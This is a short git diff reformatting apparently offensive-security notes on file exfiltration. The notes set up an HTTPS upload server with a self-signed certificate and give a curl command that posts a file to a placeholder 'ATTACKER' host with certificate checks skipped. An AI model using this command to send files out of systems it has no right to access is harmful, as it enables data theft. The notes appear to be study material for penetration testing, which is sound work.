@@ -13,7 +13,8 @@ sudo python3 -m pip install --user uploadserver
 ## Generate a self-signed certificate
 
 ```bash
-openssl req -x509 -out server.pem -keyout server.pem \ -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+openssl req -x509 -out server.pem -keyout server.pem \
+  -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 ```
 
 ---
@@ -41,5 +42,7 @@ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 # the /upload is for the uploadserver module to listen when receive our file
 # We specify the files and @ is we tell curl to read the file content instead treating the path as normal string
 # we use --insecure because we want to skip the TLS/SSL cert verification coz we use a generated self-signed cert.
-curl -X POST https://ATTACKER/upload \ -F 'files=@/path/to/file' \ --insecure
+curl -X POST https://ATTACKER/upload \
+  -F 'files=@/path/to/file' \
+  --insecure
 ```
